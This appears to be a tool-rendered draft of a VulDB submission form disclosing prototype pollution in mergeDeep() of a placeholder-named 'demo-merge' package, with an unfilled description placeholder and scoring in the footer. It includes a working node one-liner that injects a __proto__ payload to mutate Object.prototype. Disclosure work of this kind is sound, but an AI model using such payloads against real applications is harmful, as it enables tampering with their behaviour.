## VulDB Form Fields

**Vendor**
example-utils project

**Product**
demo-merge

**Version**
up to and including 2.4.1

**Class**
Prototype Pollution

**Description**
[DRAFT: Write continuous prose: affected component (src/merge.js mergeDeep()), root cause (no blocklist for __proto__, constructor, prototype), attacker action, impact (Medium 6.4), attack requirements (Auth:true UI:false), and suggested fix.]

Source → Sink → Guard:
- Source: JSON.parse(req.body) passed to mergeDeep()
- Sink:   target[key] = value in mergeDeep() at src/merge.js:42
- Guard:  no blocklist for __proto__, constructor, prototype

Observed result: prints 'yes' confirming Object.prototype mutation

Reproducer:
  node -e "const {mergeDeep}=require('./'); mergeDeep({},JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}'));" \
    && node -e "const {mergeDeep}=require('./'); mergeDeep({},JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}')); console.log({}.polluted);"

**Advisory / Exploit**
https://github.com/example/demo-merge

**CVE checkbox**
[x] vendor contacted on 2026-04-20 (response: acknowledged)
[x] no existing CVE found (NVD, GHSA, and ecosystem DB searched)
[ ] no other CNA submission in progress — confirm before submitting

---
Rendered by omv render_template  |  evidence: 100/100  |  submission: 90/100  |  status: confirmed
